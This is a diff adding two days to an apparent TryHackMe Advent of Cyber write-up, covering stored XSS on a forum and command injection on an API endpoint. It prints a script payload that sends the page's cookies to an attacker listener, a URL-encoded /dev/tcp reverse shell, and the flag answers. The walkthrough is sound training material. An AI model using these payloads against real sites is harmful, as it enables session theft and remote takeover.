@@ -1066,6 +1066,63 @@ $ ssh molly@10.10.210.167
 ```
 When successfully login to ssh see the flag in molly home directory using the command `cat flag2.txt`
 
+## Task 23  [Day 18] ELF JS
+
+McSkidy knows the crisis isn't over. The best thing to do at this point is OSINT
+
+_we need to learn more about the christmas monster_
+
+During their OSINT, they came across a Hacker Forum. Their research has shown them that this forum belongs to the Christmas Monster. Can they gain access to the admin section of the forum? They haven't made an account yet so make sure to register.
+
+Access the machine at http://[your-ip-address]:3000[](http://[your-ip-address]:3000) - **it may take a few minutes to deploy.**
+
+Check out the supporting material [here](https://docs.google.com/document/d/19TJ6ANmM-neOln0cDh7TPMbV9rsLkSDKS3nj0eJaxeg/edit#).
+
+_P.S. If you want to learn more about XSS, we have a [room](https://tryhackme.com/room/xss) where you can learn about it in depth._
+
+**Answer the questions below**
+
+Q1: What is the admin's authid cookie value?
+A: 2564799a4e6689972f6d9e1c7b406f87065cbf65
+**Solution**
+First register a account and then login with that account there you have to paste the following payload
+
+```
+payload: <script>window.location = ‘http://Local_Ip_Here:Port/page?param=’ + document.cookie </script>
+```
+
+After that you have to start a listener `netcat` is also use for this but in my case they don't work fine so i use the following command to start a listener  
+
+```
+$ ruby -run -ehttpd . -p4444
+```
+
+So now every thing is ready now you just have to wait in 2-3 min admin cookie is fetch by your listener.
+
+## Task 24  [Day 19] Commands
+
+Another day, another hack from the Christmas Monster. Can you get back control of the system?
+
+Access the web server on [http://[your-ip]:3000/]
+
+McSkidy actually found something interesting on the /api/cmd endpoint.
+
+Check out the supporting material [here](https://docs.google.com/document/d/1W65iKmUMtz-srteErhrGFJkWBXJ4Xk5PYlCZVMIZgs8/edit?usp=sharing).
+
+**Answer the questions below**
+
+Q1: What are the contents of the user.txt file?
+A: 5W7WkjxBWwhe3RNsWJ3Q
+**Solution**
+Go to the following URL 
+```URL
+http://10.10.10.10:3000/api/cmd/ls
+```
+When we go there we see they run system command and give us the output of `ls` command so we have command execution to the target system so we can use it to get reverse shell or we can just get the flag also but for me i get reverse shell first with the following URL encoded payload: 
+```ReverseShell
+sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.8.10.33%2F4444%200%3E%261
+```
+This payload give me a reverse shell with root privileges after that i go to `/home/bestadmin` directory and there i got the user flag 
 
 
 
